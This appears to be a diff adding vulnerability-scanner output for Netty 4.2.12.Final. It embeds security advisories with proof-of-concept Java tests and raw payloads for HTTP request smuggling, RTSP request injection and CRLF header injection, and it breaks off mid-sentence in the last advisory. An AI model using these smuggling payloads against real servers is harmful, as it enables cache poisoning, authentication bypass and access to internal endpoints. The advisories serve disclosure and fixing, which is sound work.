+                        │     │                   import io.netty.handler.codec.http.HttpMethod;
+                        │     │                   import io.netty.handler.codec.http.HttpRequestEncoder;
+                        │     │                   import io.netty.handler.codec.http.HttpServerCodec;
+                        │     │                   import io.netty.handler.codec.http.HttpVersion;
+                        │     │                   import io.netty.util.CharsetUtil;
+                        │     │                   public final class HttpSetUriSmugglePoc {
+                        │     │                       public static void main(String[] args) {
+                        │     │                           EmbeddedChannel client = new EmbeddedChannel(new
+                        │     │                   HttpRequestEncoder());
+                        │     │                           EmbeddedChannel server = new EmbeddedChannel(new
+                        │     │                   HttpServerCodec());
+                        │     │                           DefaultHttpRequest request = new DefaultHttpRequest(
+                        │     │                                   HttpVersion.HTTP_1_1, HttpMethod.GET,
+                        │     │                   "/safe");
+                        │     │                           request.setUri("/s1 HTTP/1.1\r\n" +
+                        │     │                                   "\r\n" +
+                        │     │                                   "POST /s2 HTTP/1.1\r\n" +
+                        │     │                                   "content-length: 11\r\n\r\n" +
+                        │     │                                   "Hello World" +
+                        │     │                                   "GET /s1");
+                        │     │                           client.writeOutbound(request);
+                        │     │                           ByteBuf outbound = client.readOutbound();
+                        │     │                           System.out.println("=== Raw encoded request ===");
+                        │     │                          
+                        │     │                   System.out.println(outbound.toString(CharsetUtil.US_ASCII));
+                        │     │                           System.out.println("=== Decoded by HttpServerCodec
+                        │     │                   ===");
+                        │     │                           server.writeInbound(outbound.retainedDuplicate());
+                        │     │                           Object msg;
+                        │     │                           while ((msg = server.readInbound()) != null) {
+                        │     │                               System.out.println(msg);
+                        │     │                           }
+                        │     │                           outbound.release();
+                        │     │                           client.finishAndReleaseAll();
+                        │     │                           server.finishAndReleaseAll();
+                        │     │                       }
+                        │     │                   }
+                        │     │                   ```
+                        │     │                   When reproduced, the raw encoded request looks like this:
+                        │     │                   ```http
+                        │     │                   GET /s1 HTTP/1.1
+                        │     │                   POST /s2 HTTP/1.1
+                        │     │                   content-length: 11
+                        │     │                   Hello WorldGET /s1 HTTP/1.1
+                        │     │                   `HttpServerCodec` then parses this as multiple HTTP messages
+                        │     │                   rather than a single request:
+                        │     │                   - `GET /s1`
+                        │     │                   - `POST /s2` with body `Hello World`
+                        │     │                   - trailing `GET /s1`
+                        │     │                   This confirms that the value supplied through `setUri()` is
+                        │     │                   interpreted on the wire as additional requests.
+                        │     │                   ### PoC (RTSP)
+                        │     │                   The same root cause also affects `RtspEncoder`. A minimal
+                        │     │                   reproduction is shown below.
+                        │     │                   import io.netty.handler.codec.rtsp.RtspDecoder;
+                        │     │                   import io.netty.handler.codec.rtsp.RtspEncoder;
+                        │     │                   import io.netty.handler.codec.rtsp.RtspMethods;
+                        │     │                   import io.netty.handler.codec.rtsp.RtspVersions;
+                        │     │                   public final class RtspSetUriSmugglePoc {
+                        │     │                   RtspEncoder());
+                        │     │                   RtspDecoder());
+                        │     │                                   RtspVersions.RTSP_1_0, RtspMethods.OPTIONS,
+                        │     │                   "rtsp://safe/media");
+                        │     │                           request.setUri("rtsp://cam/stream RTSP/1.0\r\n" +
+                        │     │                                   "CSeq: 1\r\n\r\n" +
+                        │     │                                   "DESCRIBE rtsp://cam/secret RTSP/1.0\r\n" +
+                        │     │                                   "CSeq: 2\r\n\r\n" +
+                        │     │                                   "OPTIONS rtsp://cam/final");
+                        │     │                           System.out.println("=== Raw encoded RTSP request
+                        │     │                           System.out.println("=== Decoded by RtspDecoder
+                        │     │                   When reproduced, `RtspEncoder` generates consecutive RTSP
+                        │     │                   requests in a single encoded payload:
+                        │     │                   ```text
+                        │     │                   OPTIONS rtsp://cam/stream RTSP/1.0
+                        │     │                   CSeq: 1
+                        │     │                   DESCRIBE rtsp://cam/secret RTSP/1.0
+                        │     │                   CSeq: 2
+                        │     │                   OPTIONS rtsp://cam/final RTSP/1.0
+                        │     │                   `RtspDecoder` then parses this as three separate RTSP
+                        │     │                   requests:
+                        │     │                   - `OPTIONS rtsp://cam/stream`
+                        │     │                   - `DESCRIBE rtsp://cam/secret`
+                        │     │                   - `OPTIONS rtsp://cam/final`
+                        │     │                   This confirms that the same setter bypass is exploitable for
+                        │     │                   RTSP request injection as well.
+                        │     │                   ### Impact
+                        │     │                   The vulnerable conditions are:
+                        │     │                   - The application uses `DefaultHttpRequest` or
+                        │     │                   `DefaultFullHttpRequest`
+                        │     │                   - The request object is created first and later modified
+                        │     │                   through `setUri()`
+                        │     │                   - The value passed into `setUri()` is attacker-controlled or
+                        │     │                   attacker-influenced
+                        │     │                   - The object is eventually serialized by `HttpRequestEncoder`
+                        │     │                    or `RtspEncoder`
+                        │     │                   Under those conditions, an attacker may be able to:
+                        │     │                   - perform HTTP request smuggling
+                        │     │                   - trigger proxy/backend desynchronization
+                        │     │                   - inject additional requests toward internal APIs
+                        │     │                   - confuse request boundaries and bypass assumptions around
+                        │     │                   authentication or routing
+                        │     │                   - inject RTSP requests
+                        │     │                   The exact impact depends on how the application constructs
+                        │     │                   URIs and how the upstream/downstream HTTP or RTSP components
+                        │     │                   parse request boundaries, but the security impact is real and
+                        │     │                    reproducible.
+                        │     │                   ### Root Cause
+                        │     │                   Validation is enforced only at object construction time, but
+                        │     │                   not on the public mutation API that can break the same
+                        │     │                   security invariant.
+                        │     │                   As a result, the constructors are safe while the public
+                        │     │                   `setUri()` path is not, and the encoders trust and serialize
+                        │     │                   the mutated value without revalidation.
+                        │     │                   ### Suggested Fix Direction
+                        │     │                   `DefaultHttpRequest.setUri()` and all delegating/inheriting
+                        │     │                   paths should apply the same request-line token validation as
+                        │     │                   the constructors.
+                        │     │                   Recommended regression coverage:
+                        │     │                   - verify that `setUri()` rejects CRLF-containing input after
+                        │     │                   object construction
+                        │     │                   - verify that `DefaultFullHttpRequest.setUri()` is blocked as
+                        │     │                    well
+                        │     │                   - verify that spaces, `\r`, `\n`, and request-smuggling
+                        │     │                   payloads are rejected
+                        │     │                   - verify that both `HttpRequestEncoder` and `RtspEncoder` are
+                        │     │                    protected from setter-based bypasses
+                        │     │                   ### Affected Area
+                        │     │                   - `netty-codec-http`
+                        │     │                   - `io.netty.handler.codec.rtsp.RtspEncoder` 
+                        │     ├ Severity        : MEDIUM 
+                        │     ├ VendorSeverity   ─ ghsa: 2 
+                        │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
+                        │     │                         ╰ V3Score : 5.3 
+                        │     ╰ References       ╭ [0]: https://github.com/netty/netty 
+                        │                        ╰ [1]: https://github.com/netty/netty/security/advisories/GHSA
+                        │                               -v8h7-rr48-vmmv 
+                        ├ [4] ╭ VulnerabilityID : CVE-2026-42580 
+                        │     ├ VendorIDs        ─ [0]: GHSA-m4cv-j2px-7723 
+                        │     ├ PkgName         : io.netty:netty-codec-http 
+                        │     ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
+                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
+                        │     │                  ╰ UID : 42139b2b89dda2f4 
+                        │     ├ InstalledVersion: 4.2.12.Final 
+                        │     ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
+                        │     ├ Status          : fixed 
+                        │     ├ Layer            ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab
+                        │     │                  │         09293113b8395f0ceaa 
+                        │     │                  ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e
+                        │     │                            54ebf30433b93da5788 
+                        │     ├ SeveritySource  : ghsa 
+                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42580 
+                        │     ├ DataSource       ╭ ID  : ghsa 
+                        │     │                  ├ Name: GitHub Security Advisory Maven 
+                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
+                        │     │                          osystem%3Amaven 
+                        │     ├ Fingerprint     : sha256:fd19af3af0912f46cc667512b339f4e947f97bd4cd5ddd2b8e4c0a
+                        │     │                   52f06e577c 
+                        │     ├ Title           : Netty vulnerable to HTTP Request Smuggling due to incorrect
+                        │     │                   chunk size parsing 
+                        │     ├ Description     : ### Summary
+                        │     │                   Netty's chunk size parser silently overflows int, enabling
+                        │     │                   request smuggling attacks.
+                        │     │                   
+                        │     │                   ### Details
+                        │     │                   io.netty.handler.codec.http.HttpObjectDecoder#getChunkSize
+                        │     │                   silently overflows int.
+                        │     │                   The size is accumulated as follows:
+                        │     │                   result *= 16;
+                        │     │                   result += digit;
+                        │     │                   The result is checked only for negative values. However, with
+                        │     │                    a carefully crafted chunk size, the result can be a valid
+                        │     │                   size.
+                        │     │                   ### PoC
+                        │     │                   The test below shows Netty successfully parsing the second
+                        │     │                   request, demonstrating how an attacker can smuggle a second
+                        │     │                   request inside a chunked body.
+                        │     │                   ```java
+                        │     │                   @Test
+                        │     │                   public void test() {
+                        │     │                       String requestStr = "POST / HTTP/1.1\r\n" +
+                        │     │                               "Host: localhost\r\n" +
+                        │     │                               "Transfer-Encoding: chunked\r\n\r\n" +
+                        │     │                               "100000004\r\n" +
+                        │     │                               "test\r\n" +
+                        │     │                               "0\r\n" +
+                        │     │                               "\r\n" +
+                        │     │                               "GET /smuggled HTTP/1.1\r\n" +
+                        │     │                               "Content-Length: 0\r\n" +
+                        │     │                               "\r\n";
+                        │     │                       EmbeddedChannel channel = new EmbeddedChannel(new
+                        │     │                   HttpRequestDecoder());
+                        │     │                      
+                        │     │                   assertTrue(channel.writeInbound(Unpooled.copiedBuffer(request
+                        │     │                   Str, CharsetUtil.US_ASCII)));
+                        │     │                       // Request 1
+                        │     │                       HttpRequest request = channel.readInbound();
+                        │     │                       assertTrue(request.decoderResult().isSuccess());
+                        │     │                       HttpContent content = channel.readInbound();
+                        │     │                       assertTrue(content.decoderResult().isSuccess());
+                        │     │                       assertEquals("test",
+                        │     │                   content.content().toString(CharsetUtil.US_ASCII));
+                        │     │                       content.release();
+                        │     │                       LastHttpContent last = channel.readInbound();
+                        │     │                       assertTrue(last.decoderResult().isSuccess());
+                        │     │                       last.release();
+                        │     │                       // Request 2
+                        │     │                       request = channel.readInbound();
+                        │     │                       last = channel.readInbound();
+                        │     │                   }
+                        │     │                   ```
+                        │     │                   ### Impact
+                        │     │                   HTTP Request Smuggling: Attacker injects arbitrary HTTP
+                        │     │                   requests 
+                        │     ├ Severity        : MEDIUM 
+                        │     ├ VendorSeverity   ─ ghsa: 2 
+                        │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L 
+                        │     │                         ╰ V3Score : 6.5 
+                        │     ╰ References       ╭ [0]: https://github.com/netty/netty 
+                        │                        ╰ [1]: https://github.com/netty/netty/security/advisories/GHSA
+                        │                               -m4cv-j2px-7723 
+                        ├ [5] ╭ VulnerabilityID : CVE-2026-42581 
+                        │     ├ VendorIDs        ─ [0]: GHSA-xxqh-mfjm-7mv9 
+                        │     ├ PkgName         : io.netty:netty-codec-http 
+                        │     ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
+                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
+                        │     │                  ╰ UID : 42139b2b89dda2f4 
+                        │     ├ InstalledVersion: 4.2.12.Final 
+                        │     ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
+                        │     ├ Status          : fixed 
+                        │     ├ Layer            ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab
+                        │     │                  │         09293113b8395f0ceaa 
+                        │     │                  ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e
+                        │     │                            54ebf30433b93da5788 
+                        │     ├ SeveritySource  : ghsa 
+                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42581 
+                        │     ├ DataSource       ╭ ID  : ghsa 
+                        │     │                  ├ Name: GitHub Security Advisory Maven 
+                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
+                        │     │                          osystem%3Amaven 
+                        │     ├ Fingerprint     : sha256:72cf81117c94862e4ed59b95baa0b57c71ce73d30515701313fa58
+                        │     │                   3eec46f1c1 
+                        │     ├ Title           : Netty HTTP/1.0 TE+CL Coexistence Bypasses Smuggling
+                        │     │                   Sanitization 
+                        │     ├ Description     : # NETTY HTTP/1.0 TE+CL Coexistence Bypasses Smuggling
+                        │     │                   Sanitization
+                        │     │                   
+                        │     │                   | Field     | Value |
+                        │     │                   |-----------|-------|
+                        │     │                   | Library   | `io.netty:netty-codec-http` |
+                        │     │                   | Component | `codec-http` — `HttpObjectDecoder` |
+                        │     │                   | Severity  | **HIGH** |
+                        │     │                   | Affects   | HEAD, commit `4f3533ae` confirmed |
+                        │     │                   ---
+                        │     │                   ## Summary
+                        │     │                   `HttpObjectDecoder` strips a conflicting `Content-Length`
+                        │     │                   header when a request carries both `Transfer-Encoding:
+                        │     │                   chunked` and `Content-Length`, but only for HTTP/1.1
+                        │     │                   messages. The guard is absent for HTTP/1.0. An attacker that
+                        │     │                   sends an HTTP/1.0 request with both headers causes Netty to
+                        │     │                   decode the body as chunked while leaving `Content-Length`
+                        │     │                   intact in the forwarded `HttpMessage`. Any downstream proxy
+                        │     │                   or handler that trusts `Content-Length` over
+                        │     │                   `Transfer-Encoding` will disagree on message boundaries,
+                        │     │                   enabling request smuggling.
+                        │     │                   ## Root Cause
+                        │     │                   ```java
+                        │     │                   // HttpObjectDecoder.java:828-833
+                        │     │                   if (HttpUtil.isTransferEncodingChunked(message)) {
+                        │     │                       this.chunked = true;
+                        │     │                       if (!contentLengthFields.isEmpty() &&
+                        │     │                   message.protocolVersion() == HttpVersion.HTTP_1_1) {
+                        │     │                          
+                        │     │                   handleTransferEncodingChunkedWithContentLength(message);  //
+                        │     │                   strips CL — HTTP/1.1 only
+                        │     │                       }
+                        │     │                       return State.READ_CHUNK_SIZE;
+                        │     │                   }
+                        │     │                   // HttpObjectDecoder.java:870-873
+                        │     │                   protected void
+                        │     │                   handleTransferEncodingChunkedWithContentLength(HttpMessage
+                        │     │                   message) {
+                        │     │                      
+                        │     │                   message.headers().remove(HttpHeaderNames.CONTENT_LENGTH);
+                        │     │                       contentLength = Long.MIN_VALUE;
+                        │     │                   ```
+                        │     │                   The conflict-resolution path is gated on
+                        │     │                   `message.protocolVersion() == HttpVersion.HTTP_1_1`. When the
+                        │     │                    request declares `HTTP/1.0`, the condition is false,
+                        │     │                   `handleTransferEncodingChunkedWithContentLength` is never
+                        │     │                   called, and the `Content-Length` header survives into the
+                        │     │                   forwarded message. Netty still processes the body as chunked;
+                        │     │                    a downstream component that is CL-first interprets the same
+                        │     │                   bytes as a separate request.
+                        │     │                   ## Proof of Concept
+                        │     │                   POST /api HTTP/1.0\r\n
+                        │     │                   Host: internal.example.com\r\n
+                        │     │                   Transfer-Encoding: chunked\r\n
+                        │     │                   Content-Length: 0\r\n
+                        │     │                   \r\n
+                        │     │                   5\r\n
+                        │     │                   GPOST\r\n
+                        │     │                   0\r\n
+                        │     │                   Netty consumes the full chunked body (5 bytes + terminator).
+                        │     │                   A downstream CL-first proxy reads `Content-Length: 0`,
+                        │     │                   considers the request complete at the blank line, and treats
+                        │     │                   `5\r\nGPOST\r\n0\r\n\r\n` as the start of a second request.
+                        │     │                   ## Conditions Required
+                        │     │                   1. Netty is deployed behind a reverse proxy or load balancer
+                        │     │                   that is `Content-Length`-first (nginx, some HAProxy configs,
+                        │     │                   AWS ALB in certain modes).
+                        │     │                   2. Attacker can send HTTP/1.0 requests (either directly or by
+                        │     │                    downgrading via connection manipulation).
+                        │     │                   3. No additional HTTP/1.0 stripping layer between attacker
+                        │     │                   and Netty.
+                        │     │                   ## Impact
+                        │     │                   Request smuggling at the Netty edge. Allows cache poisoning,
+                        │     │                   session fixation against other users, unauthorized access to
+                        │     │                   internal endpoints, and bypassing of WAF or authentication
+                        │     │                   layers that inspect only the first logical request.
+                        │     │                   ## Confirmed PoC Test
+                        │     │                   Verified against HEAD (`4f3533ae`) using `EmbeddedChannel`.
+                        │     │                   Both tests pass, confirming the vulnerability and the
+                        │     │                   HTTP/1.1 contrast.
+                        │     │                   package io.netty.handler.codec.http;
+                        │     │                   import io.netty.buffer.Unpooled;
+                        │     │                   import io.netty.channel.embedded.EmbeddedChannel;
+                        │     │                   import io.netty.util.CharsetUtil;
+                        │     │                   import org.junit.jupiter.api.Test;
+                        │     │                   import static org.junit.jupiter.api.Assertions.*;
+                        │     │                   public class NettySmugglingSec001Test {
+                        │     │                       // VULNERABLE: Content-Length survives in HTTP/1.0 TE+CL
+                        │     │                   conflict
+                        │     │                       @Test
+                        │     │                       public void http10_contentLengthNotStripped() {
+                        │     │                           EmbeddedChannel ch = new EmbeddedChannel(new
+                        │     │                   HttpRequestDecoder());
+                        │     │                           ch.writeInbound(Unpooled.copiedBuffer(
+                        │     │                                   "POST /api HTTP/1.0\r\n" +
+                        │     │                                   "Transfer-Encoding: chunked\r\n" +
+                        │     │                                   "Content-Length: 0\r\n" +
+                        │     │                                   "\r\n" +
+                        │     │                                   "5\r\nGPOST\r\n0\r\n\r\n",
+                        │     │                   CharsetUtil.US_ASCII));
+                        │     │                           HttpRequest req = ch.readInbound();
+                        │     │                           assertEquals(HttpVersion.HTTP_1_0,
+                        │     │                   req.protocolVersion());
+                        │     │                           // Content-Length: 0 survives — downstream CL-first
+                        │     │                   proxy treats chunked body as new request
+                        │     │                   assertNotNull(req.headers().get(HttpHeaderNames.CONTENT_LENGT
+                        │     │                   H), "VULNERABLE: CL not stripped");
+                        │     │                           ch.finishAndReleaseAll();
+                        │     │                       // SAFE: HTTP/1.1 correctly strips Content-Length on
+                        │     │                   TE+CL conflict
+                        │     │                       public void http11_contentLengthStripped() {
+                        │     │                                   "POST /api HTTP/1.1\r\n" +
+                        │     │                   assertNull(req.headers().get(HttpHeaderNames.CONTENT_LENGTH),
+                        │     │                    "SAFE: CL correctly stripped");
+                        │     │                   ## Fix Guidance
+                        │     │                   Remove the `message.protocolVersion() ==
+                        │     │                   HttpVersion.HTTP_1_1` guard in `HttpObjectDecoder`, applying
+                        │     │                   `handleTransferEncodingChunkedWithContentLength`
+                        │     │                   unconditionally whenever both `Transfer-Encoding: chunked`
+                        │     │                   and `Content-Length` are present, regardless of protocol
+                        │     │                   version. 
+                        │     ├ Severity        : MEDIUM 
+                        │     ├ VendorSeverity   ─ ghsa: 2 
+                        │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N 
+                        │     │                         ╰ V3Score : 5.8 
+                        │     ╰ References       ╭ [0]: https://github.com/netty/netty 
+                        │                        ╰ [1]: https://github.com/netty/netty/security/advisories/GHSA
+                        │                               -xxqh-mfjm-7mv9 
+                        ├ [6] ╭ VulnerabilityID : CVE-2026-42585 
+                        │     ├ VendorIDs        ─ [0]: GHSA-38f8-5428-x5cv 
+                        │     ├ PkgName         : io.netty:netty-codec-http 
+                        │     ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
+                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
+                        │     │                  ╰ UID : 42139b2b89dda2f4 
+                        │     ├ InstalledVersion: 4.2.12.Final 
+                        │     ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
+                        │     ├ Status          : fixed 
+                        │     ├ Layer            ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab
+                        │     │                  │         09293113b8395f0ceaa 
+                        │     │                  ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e
+                        │     │                            54ebf30433b93da5788 
+                        │     ├ SeveritySource  : ghsa 
+                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42585 
+                        │     ├ DataSource       ╭ ID  : ghsa 
+                        │     │                  ├ Name: GitHub Security Advisory Maven 
+                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
+                        │     │                          osystem%3Amaven 
+                        │     ├ Fingerprint     : sha256:b46b273bd940f7726128eeb24c54ec74db1e46eda2a4f81bd03121
+                        │     │                   3c9ad12ec1 
+                        │     ├ Title           : Netty vulnerable to HTTP Request Smuggling due to malformed
+                        │     │                   Transfer-Encoding 
+                        │     ├ Description     : ### Summary
+                        │     │                   Netty incorrectly parses malformed Transfer-Encoding,
+                        │     │                   enabling request smuggling attacks.
+                        │     │                   
+                        │     │                   ### Details
+                        │     │                   Netty incorrectly marks a request as chunked when malformed
+                        │     │                   "Transfer-Encoding: chunked, identity" is present.
+                        │     │                   According to RFC
+                        │     │                   https://datatracker.ietf.org/doc/html/rfc9112#name-message-bo
+                        │     │                   dy-length
+                        │     │                   "
+                        │     │                   If a Transfer-Encoding header field is present in a request
+                        │     │                   and the chunked transfer coding is not the final encoding,
+                        │     │                    the message body length cannot be determined reliably; the
+                        │     │                   server MUST respond with the 400 (Bad Request)
+                        │     │                    status code and then close the connection.
+                        │     │                   A possible scenario is when Netty is behind a proxy that
+                        │     │                   doesn't reject requests with "Transfer-Encoding: chunked,
+                        │     │                   identity", but prefers "Content-Length" and forwards the
+                        │     │                   content to Netty.
+                        │     │                   ### PoC
+                        │     │                   The test below shows Netty successfully parsing the second
+                        │     │                   request, demonstrating how an attacker can smuggle a second
+                        │     │                   request inside a request body.
+                        │     │                   ```java
+                        │     │                   @Test
+                        │     │                       public void test() {
+                        │     │                           String requestStr = "POST / HTTP/1.1\r\n" +
+                        │     │                                   "Host: localhost\r\n" +
+                        │     │                                   "Transfer-Encoding: chunked, identity\r\n" +
+                        │     │                                   "Content-Length: 48\r\n" +
+                        │     │                                   "\r\n" +
+                        │     │                                   "0\r\n" +
+                        │     │                                   "GET /smuggled HTTP/1.1\r\n" +
+                        │     │                                   "\r\n";
+                        │     │                           EmbeddedChannel channel = new EmbeddedChannel(new
+                        │     │                   HttpRequestDecoder());
+                        │     │                          
+                        │     │                   assertTrue(channel.writeInbound(Unpooled.copiedBuffer(request
+                        │     │                   Str, CharsetUtil.US_ASCII)));
+                        │     │                           // Request 1
+                        │     │                           HttpRequest request = channel.readInbound();
+                        │     │                           assertTrue(request.decoderResult().isSuccess());
+                        │     │                   assertTrue(request.headers().contains("Transfer-Encoding"));
+                        │     │                   assertFalse(request.headers().contains("Content-Length"));
+                        │     │                           LastHttpContent last = channel.readInbound();
+                        │     │                           assertTrue(last.decoderResult().isSuccess());
+                        │     │                           last.release();
+                        │     │                           // Request 2
+                        │     │                           request = channel.readInbound();
+                        │     │                           last = channel.readInbound();
+                        │     │                       }
+                        │     │                   ```
+                        │     │                   ### Impact
+                        │     │                   HTTP Request Smuggling: Attacker injects arbitrary HTTP
+                        │     │                   requests 
+                        │     ├ Severity        : MEDIUM 
+                        │     ├ VendorSeverity   ─ ghsa: 2 
+                        │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N 
+                        │     │                         ╰ V3Score : 6.5 
+                        │     ╰ References       ╭ [0]: https://datatracker.ietf.org/doc/html/rfc9112#name-mess
+                        │                        │      age-body-length 
+                        │                        ├ [1]: https://github.com/netty/netty 
+                        │                        ╰ [2]: https://github.com/netty/netty/security/advisories/GHSA
+                        │                               -38f8-5428-x5cv 
+                        ╰ [7] ╭ VulnerabilityID : CVE-2026-42578 
+                              ├ VendorIDs        ─ [0]: GHSA-45q3-82m4-75jr 
+                              ├ PkgName         : io.netty:netty-handler-proxy 
+                              ├ PkgPath         : openaf/Kube/netty-handler-proxy-4.2.12.Final.jar 
+                              ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-handler-proxy@4.2.12.Final 
+                              │                  ╰ UID : 8344d1e8c7524c10 
+                              ├ InstalledVersion: 4.2.12.Final 
+                              ├ FixedVersion    : 4.1.133.Final, 4.2.13.Final 
+                              ├ Status          : fixed 
+                              ├ Layer            ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab
+                              │                  │         09293113b8395f0ceaa 
+                              │                  ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e
+                              │                            54ebf30433b93da5788 
+                              ├ SeveritySource  : ghsa 
+                              ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42578 
+                              ├ DataSource       ╭ ID  : ghsa 
+                              │                  ├ Name: GitHub Security Advisory Maven 
+                              │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
+                              │                          osystem%3Amaven 
+                              ├ Fingerprint     : sha256:4ba27fa700c27b8bbc260e1b81a6b29d72918d1e85dcf69a565335
+                              │                   21bf389365 
+                              ├ Title           : Netty has HTTP Header Injection via HttpProxyHandler Disabled
+                              │                    Validation (Incomplete Fix CVE-2025-67735) 
+                              ├ Description     : # Security Vulnerability Report: HTTP Header Injection via
+                              │                   HttpProxyHandler Disabled Validation in Netty
+                              │                   
+                              │                   ## 1. Vulnerability Summary
+                              │                   | Field | Value |
+                              │                   |-------|-------|
+                              │                   | **Product** | Netty |
+                              │                   | **Version** | 4.2.12.Final (and all prior versions) |
+                              │                   | **Component** | `io.netty.handler.proxy.HttpProxyHandler`
+                              │                   |
+                              │                   | **Vulnerability Type** | CWE-113: Improper Neutralization
+                              │                   of CRLF Sequences in HTTP Headers |
+                              │                   | **Impact** | HTTP Header Injection in CONNECT Proxy
+                              │                   Requests |
+                              │                   | **CVSS 3.1 Score** | **7.5 (High)** |
+                              │                   | **CVSS 3.1 Vector** |
+                              │                   `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` |
+                              │                   | **Related Advisory** | **GHSA-84h7-rjj3-6jx4** (Incomplete
+                              │                   Fix) |
+                              │                   ## 2. Affected Components
+                              │                   - `io.netty.handler.proxy.HttpProxyHandler` —
+                              │                   `newInitialMessage()` method (line 176) explicitly disables
+                              │                   header validation via `withValidation(false)`
+                              │                   ## 3. Vulnerability Description
+                              │                   Netty's `HttpProxyHandler` constructs HTTP CONNECT requests
+                              │                   with **header validation explicitly disabled**. The
+                              │                   `newInitialMessage()` method (line 176) creates headers using
+                              │                   `DefaultHttpHeadersFactory.headersFactory().withValidation(fa
+                              │                   lse)`, then adds user-provided `outboundHeaders` (line
+                              │                   188-190) without any CRLF validation. This allows an attacker
+                              │                    who can influence the outbound headers to inject arbitrary
+                              │                   HTTP headers into the CONNECT request sent to the proxy
+                              │                   server.
+                              │                   ### Root Cause
+                              │                   ```java
+                              │                   // HttpProxyHandler.java:176-190
+                              │                   protected Object newInitialMessage(ChannelHandlerContext ctx)
+                              │                    throws Exception {
+                              │                       // ...
+                              │                       HttpHeadersFactory headersFactory =
+                              │                   DefaultHttpHeadersFactory.headersFactory()
+                              │                           .withValidation(false);  // <-- VALIDATION EXPLICITLY
+                              │                    DISABLED
+                              │                       FullHttpRequest req = new DefaultFullHttpRequest(
+                              │                           HttpVersion.HTTP_1_1, HttpMethod.CONNECT,
+                              │                           url, Unpooled.EMPTY_BUFFER, headersFactory,
+                              │                   headersFactory);
+                              │                       req.headers().set(HttpHeaderNames.HOST, hostHeader);
+                              │                       if (authorization != null) {
+                              │                          
+                              │                   req.headers().set(HttpHeaderNames.PROXY_AUTHORIZATION,
+                              │                   authorization);
+                              │                       }
+                              │                       if (outboundHeaders != null) {
+                              │                           req.headers().add(outboundHeaders);  // <-- USER
+                              │                   HEADERS ADDED WITHOUT VALIDATION
+                              │                       return req;
+                              │                   }
+                              │                   ```
+                              │                   The `outboundHeaders` parameter comes from the
+                              │                   `HttpProxyHandler` constructor (lines 80-93, 99-127), which
+                              │                   is supplied by application code.
+                              │                   ### Incomplete Fix of GHSA-84h7-rjj3-6jx4
+                              │                   **This vulnerability represents an incomplete fix of the
+                              │                   previously acknowledged security advisory
+                              │                   [GHSA-84h7-rjj3-6jx4](https://github.com/netty/netty/security
+                              │                   /advisories/GHSA-84h7-rjj3-6jx4).**
+                              │                   The GHSA-84h7-rjj3-6jx4 fix addressed HTTP CRLF injection by
+                              │                   adding URI validation via `validateRequestLineTokens()` in
+                              │                   `DefaultHttpRequest` and enabling header validation by
+                              │                   default through `DefaultHttpHeadersFactory`. However,
+                              │                   `HttpProxyHandler` **explicitly opts out** of the fix by
+                              │                   calling `withValidation(false)`, creating a gap where:
+                              │                   1. The GHSA-84h7-rjj3-6jx4 fix's header validation is
+                              │                   bypassed
+                              │                   2. User-provided `outboundHeaders` are added without any CRLF
+                              │                    check
+                              │                   3. The resulting CONNECT request contains unvalidated headers
+                              │                    on the wire
+                              │                   This is not a new vulnerability class — it is the **same CRLF
+                              │                    injection** that GHSA-84h7-rjj3-6jx4 was supposed to fix,
+                              │                   but `HttpProxyHandler` was missed during the remediation. The
+                              │                    fix for GHSA-84h7-rjj3-6jx4 should be extended to cover this
+                              │                    code path.
+                              │                   ## 4. Exploitability Prerequisites
+                              │                   This vulnerability is exploitable when:
+                              │                   1. An application uses `HttpProxyHandler` with
+                              │                   user-influenced `outboundHeaders`
+                              │                   2. The application does not perform its own CRLF sanitization
+                              │                    on header values
+                              │                   **Common affected patterns**:
+                              │                   - HTTP proxy clients that forward user-specified custom
+                              │                   headers
+                              │                   - Web scraping frameworks that allow users to set proxy
+                              │                   - API gateways that pass user headers through a proxy tunnel
+                              │                   ## 5. Attack Scenarios
+                              │                   ### Scenario 1: Proxy Authentication Bypass
+                              │                   HttpHeaders headers = new DefaultHttpHeaders(false);
+                              │                   headers.set("X-Forwarded-For", userInput);  // userInput from
+                              │                    attacker
+                              │                   new HttpProxyHandler(proxyAddr, headers);
+                              │                   **Attack input**: `userInput =
